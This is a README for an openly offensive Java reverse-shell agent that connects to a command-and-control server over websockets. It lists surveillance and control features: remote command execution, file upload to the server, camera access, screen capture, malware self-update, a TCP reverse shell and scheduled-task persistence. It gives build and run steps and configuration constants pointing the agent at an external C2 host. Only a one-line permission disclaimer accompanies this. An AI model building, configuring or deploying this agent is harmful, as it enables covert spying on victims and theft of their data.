# Java Reverse Shell with Websockets

This Java project implements a reverse shell that connects to a command and control server using websockets.

## Features

- Remote Command Execution  
- Upload Files to C2 Server
- Play rick roll on target computer
- Access camera
- Screen Capture
- Update Malware From C2 Server
- Spawn a TCP Reverse Shell
- Persistence via Windows Scheduler  

## Table of Contents

- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Security Considerations](#security-considerations)
- [C2 Components](#C2-Components)
- [Contributing](#contributing)

## Prerequisites

Before you begin, ensure you have the following prerequisites:

- Java Development Kit (JDK) installed
- Maven installed

## Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/The-Hustler-Hattab/ReverseShellWebSocketAgent.git
    ```

2. Navigate to the project folder:

    ```bash
    cd ReverseShellWebSocketAgent
    ```

3. Build the project using Maven:

    ```bash
    mvn clean install
    ```

## Usage
The project will generate jar with dependencies and exe file.
To use the reverse shell, run the following command:

```bash
java -jar target/reverseShell-1.0.1-jar-with-dependencies.jar
```
## Configuration
Configure the reverse shell by editing the src/main/com/mtattab/reverseshell/util/constants file. Update the following properties:
```java
public static final String SERVER_WEBSOCKET_URI = "wss://c2-server.mtattab.com/reverseShellClients" ; // c2 websocket uri
public static final String SERVER_HTTP_URI = "https://c2-server.mtattab.com" ; // c2 uri for uploading files to s3
```


## Security Considerations
Ensure that you have permission to run the reverse shell on the target system.
Use secure connections (e.g., HTTPS) for the command and control server.
Implement additional security measures as needed for your specific use case.

## C2-Components

[C2 UI](https://github.com/The-Hustler-Hattab/c2-ui)  
[C2 Server](https://github.com/The-Hustler-Hattab/C2JavaServer)   
[C2 JAVA Agent](https://github.com/The-Hustler-Hattab/ReverseShellWebSocketAgent)  
[C2 C# .NET Agent (RECOMMENDED)](https://github.com/The-Hustler-Hattab/WebSocketReverseShellDotNet)

## Contributing
Contributions are welcome! 
Please make a pull request for new features